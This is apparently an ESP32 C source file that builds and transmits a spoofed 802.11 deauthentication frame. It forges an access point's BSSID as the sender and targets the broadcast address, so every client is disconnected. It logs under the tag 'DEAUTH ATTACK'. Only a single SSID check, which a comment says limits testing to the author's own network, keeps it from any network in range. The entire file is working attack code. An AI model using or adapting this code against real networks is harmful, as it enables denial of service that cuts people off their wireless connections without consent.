#include "deauth.h"

void sendDeauthPacket()
{
    wifi_ap_record_t rec = showNearbyNetworks();
    

    // testing only on my local network.
    if(strcmp((char*)rec.ssid, "dima570") != 0){
        return;
    }

    const char* ATTACK_TAG = "DEAUTH ATTACK";
    ESP_LOGI(ATTACK_TAG,"%s\n", rec.ssid);

    dauthPacket pkt = {
        .type = 0xC0,
        .subtype = 0x00,
        .duration = 0x0000,
        .fragment_and_seq = 0x0000,
        .rescode0 = 0x01,
        .rescode1 = 0x00
    };

    pkt.targetMac[0] = 0xFF;
    pkt.targetMac[1] = 0xFF; 
    pkt.targetMac[2] = 0xFF;
    pkt.targetMac[3] = 0xFF;
    pkt.targetMac[4] = 0xFF;
    pkt.targetMac[5] = 0xFF;

    pkt.sourceMac[0] = rec.bssid[0];
    pkt.sourceMac[1] = rec.bssid[1];
    pkt.sourceMac[2] = rec.bssid[2];
    pkt.sourceMac[3] = rec.bssid[3];
    pkt.sourceMac[4] = rec.bssid[4];
    pkt.sourceMac[5] = rec.bssid[5];

    pkt.bssid[0] = rec.bssid[0];
    pkt.bssid[1] = rec.bssid[1];
    pkt.bssid[2] = rec.bssid[2];
    pkt.bssid[3] = rec.bssid[3];
    pkt.bssid[4] = rec.bssid[4];
    pkt.bssid[5] = rec.bssid[5];

    
    ESP_ERROR_CHECK(esp_wifi_80211_tx(WIFI_IF_STA, &pkt, sizeof(pkt), false));
}